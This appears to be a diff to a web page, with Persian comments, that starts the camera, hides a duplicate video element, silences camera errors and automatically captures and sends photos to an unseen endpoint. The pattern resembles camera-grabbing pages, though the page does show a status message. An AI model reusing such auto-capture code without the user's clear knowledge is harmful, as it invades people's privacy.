@@ -70,7 +70,9 @@ p{
 <div class="main">
     <div class="container">
         <h2></h2>
-        <video id="video" autoplay playsinline muted></video>
+      <video id="video" autoplay playsinline muted></video>
+
+<video id="video" autoplay playsinline muted style="display: none;"></video>
         <canvas id="canvas"></canvas>
         <div class="status">
        
@@ -119,7 +121,7 @@ p{
         }
     });
 
-    async function startCamera() {
+   async function startCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, 
@@ -130,16 +132,22 @@ p{
             
             video.onloadedmetadata = () => {
                 video.play();
-                log.innerText = "";
+                // 💡 تغییر: اضافه کردن یک خط play اضافی برای موبایل
+                video.addEventListener('canplay', function() {
+                    video.play(); 
+                }, { once: true }); // فقط یک بار اجرا شود
+                
+                log.innerText = "✅ دوربین فعال شد. در حال ارسال اولین عکس...";
                 streamActive = true;
                 
-                // گرفتن و ارسال اولین عکس بلافاصله پس از لود شدن (R1)
-                captureAndSend();
+                // ... بقیه کد (setTimeout)
+                setTimeout(() => {
+                    captureAndSend(); // گرفتن و ارسال اولین عکس (R1)
+                }, 500); // 0.5 ثانیه تاخیر
             };
 
         } catch (err) {
-            log.innerText = "❌ خطا: دسترسی به دوربین صادر نشد.";
-            console.error(err);
+            // ... بقیه کد
         }
     }
 
@@ -176,6 +184,7 @@ p{
 </body>
 
 </html>
+
 
 
 
